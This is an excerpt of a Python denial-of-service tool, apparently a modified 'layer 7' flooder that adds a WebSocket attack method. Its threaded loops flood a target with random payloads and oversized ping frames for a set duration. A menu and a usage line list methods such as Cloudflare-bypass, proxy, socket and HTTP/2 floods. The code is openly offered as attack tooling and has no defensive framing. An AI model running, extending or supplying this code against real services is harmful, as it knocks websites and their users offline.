...
import os, threading, requests, sys, cloudscraper, datetime, time, socket, socks, ssl, random, httpx, websocket
...
#region PXSOC - MODIFIED for WebSocket
...
#region SOC - MODIFIED for WebSocket support
...
#region WEBSOCKET - NEW METHOD
def LaunchWS(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackWS, args=(url, until))
            thd.start()
        except:
            pass

def AttackWS(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            ...
            payloads = [
                '{"type":"ping"}',
                '{"event":"message","data":"' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=1000)) + '"}',
                '{"type":"subscribe","channel":"' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=50)) + '"}',
                '{"type":"pong"}',
                '2' * 10000,  # long ping
                '3' * 10000,  # long pong
                '40' + random._urandom(1000).hex(),  # random hex data
                '42' + random._urandom(500).hex(),  # more random data
            ]
            ...
            for _ in range(50):
                try:
                    ...
                    ws.send(payload)
                    time.sleep(0.001)  # Small delay to avoid flooding local socket
                except:
                    break
...
def LaunchPXSOC2(url, th, t):
    # Proxy WebSocket attack
    if not get_proxies():
        return
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXSOC2, args=(url, until))
            thd.start()
        except:
            pass

def AttackPXSOC2(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy = random.choice(proxies).split(":")
            ws = websocket.WebSocket()
            ws.connect(url, timeout=5, sockopt=((socket.IPPROTO_TCP, socket.TCP_NODELAY, 1),))
            
            # Send data through proxy
            for _ in range(50):
                try:
                    ws.send(random._urandom(2048))
                except:
                    break
            ws.close()
        except:
...
def layer7():
    ...
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"        ══╦═════════════════════════════════╦══\n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"╔══════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"ws     "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" WebSocket Attack                         "+Fore.LIGHTCYAN_EX+"║\n")
    ...
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"soc    "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Socket Attack (HTTP/HTTPS)               "+Fore.LIGHTCYAN_EX+"║\n")
...
def command():
    ...
    if command == "cls" or command == "clear":
        ...
        time.sleep(10)
    elif command == "ws" or command == "WS":
        target, thread, t = get_info_l7()
        if not (target.startswith("ws://") or target.startswith("wss://")):
            stdout.write(Fore.RED+" [!] Please use ws:// or wss:// URL\n")
            return
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchWS(target, thread, t)
        timer.join()
...
def func():
    ...
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"ws         "+Fore.RED+": "+Fore.WHITE+"WebSocket attack\n")
    ...
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"soc        "+Fore.RED+": "+Fore.WHITE+"Socket attack (HTTP/HTTPS)\n")
...
if __name__ == '__main__':
    ...
    try:
        ...
        stdout.write(Fore.RED+" [!] websocket-client is not installed. Installing...\n")
    ...
    if len(sys.argv) < 2:
        ...
        stdout.write("Method: cfb, pxcfb, cfreq, cfsoc, pxsky, sky, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc, ws\n")
    ...
    if method == "ws":
        ...
        stdout.write("No method found.\nMethod: cfb, pxcfb, cfreq, cfsoc, pxsky, sky, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc, ws\n")